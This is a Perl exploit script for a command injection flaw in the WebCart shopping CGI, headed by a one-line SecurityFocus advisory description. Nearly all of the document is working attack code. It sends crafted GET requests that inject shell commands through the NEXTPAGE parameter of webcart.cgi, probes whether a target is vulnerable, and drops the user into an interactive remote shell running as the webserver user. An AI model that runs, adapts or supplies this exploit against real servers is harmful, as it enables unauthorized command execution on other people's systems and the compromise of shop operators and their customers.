source: http://www.securityfocus.com/bid/3453/info

Mountain Network Systems WebCart is a cgi based online shopping suite. An error in the webcart.cgi script allows a remote user to pass an arbitrary shell command which will be executed by the script. 

#####################################################
# WebCart exploit
# Spawn bash style Shell with webserver uid
#
# Spabam 2003 PRIV8 code
# #hackarena irc.brasnet.org
# This Script is currently under development
#####################################################
use strict;
use IO::Socket;
my $host;
my $port;
my $command;
my $url;
my @results;
my $probe;
my @U;
my $shit;
$U[1] = "/cgi-bin/webcart/webcart.cgi?CONFIG=mountain&CHANGE=YES&NEXTPAGE=;";
&intro;
&scan;
&choose;
&command;
&exit;
sub intro {
&help;
&host;
&server;
sleep 3;
};
sub host {
print "\nHost or IP : ";
$host=<STDIN>;
chomp $host;
if ($host eq ""){$host="127.0.0.1"};
$shit="|&CODE=PHOLD";
$port="80";
chomp $port;
if ($port =~/\D/ ){$port="80"};
if ($port eq "" ) {$port = "80"};
};
sub server {
my $X;
print "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n";
$probe = "string";
my $output;
my $webserver = "something";
&connect;
for ($X=0; $X<=10; $X++){
	$output = $results[$X];
	if (defined $output){
	if ($output =~/Apache/){ $webserver = "Apache" };
	};
};
if ($webserver ne "Apache"){
my $choice = "y";
chomp $choice;
if ($choice =~/N/i) {&exit};
            }else{
print "\n\nOK";
	};		
};  
sub scan {
my $status = "not_vulnerable";
print "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n";
my $loop;
my $output;
my $flag;
$command="dir";
for ($loop=1; $loop < @U; $loop++) { 
$flag = "0";
$url = $U[$loop];
$probe = "scan";
&connect;
foreach $output (@results){
if ($output =~ /Directory/) {
                              $flag = "1";
			      $status = "vulnerable";
			      };
	};
if ($flag eq "0") { 
}else{
     };
};
if ($status eq "not_vulnerable"){

				};
};
sub choose {
my $choice="0";
chomp $choice;
if ($choice > @U){ &choose };
if ($choice =~/\D/g ){ &choose };
if ($choice == 0){ &other };
$url = $U[$choice];
};
sub other {
my $other = "/cgi-bin/webcart/webcart.cgi?CONFIG=mountain&CHANGE=YES&NEXTPAGE=;";
chomp $other;
$U[0] = $other;
};
sub command {
while ($command !~/quit/i) {
print "\n[$host]\$ ";
$command = <STDIN>;
chomp $command;
if ($command =~/quit/i) { &exit };
if ($command =~/url/i) { &choose }; 
if ($command =~/scan/i) { &scan };
if ($command =~/help/i) { &help };
$command =~ s/\s/+/g; 
$probe = "command";
if ($command !~/quit|url|scan|help/) {&connect};
};
&exit;
};  
sub connect {
my $connection = IO::Socket::INET->new (
				Proto => "tcp",
				PeerAddr => "$host",
				PeerPort => "$port",
				) or die "\nSorry UNABLE TO CONNECT To $host On Port $port.\n";
$connection -> autoflush(1);
if ($probe =~/command|scan/){
print $connection "GET $url$command$shit HTTP/1.0\r\n\r\n";
}elsif ($probe =~/string/) {
print $connection "HEAD / HTTP/1.0\r\n\r\n";
};

while ( <$connection> ) { 
			@results = <$connection>;
			 };
close $connection;
if ($probe eq "command"){ &output };
if ($probe eq "string"){ &output };
};  
sub output{
my $display;
if ($probe eq "string") {
			my $X;
			for ($X=0; $X<=10; $X++) {
			$display = $results[$X];
			if (defined $display){print "$display";};
			sleep 1;
				};
			}else{
			foreach $display (@results){
			    print "$display";
			    sleep 1;
				};
                          };
};  
sub exit{
print "\n\n\n
SPABAM 2003.";
print "\n\n\n";
exit;
};
sub help {
print "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n";
print "\n
        WebCart.pl v1.0 by SPABAM 2003";
print "\n
";
print "\n WebCart Exploit";
print "\n 

note.. web directory is normally /var/www/html";
print "\n";
print "\n Host: www.victim.com or xxx.xxx.xxx.xxx (RETURN for 127.0.0.1)";
print "\n\n\n\n\n\n\n\n\n\n\n\n";
};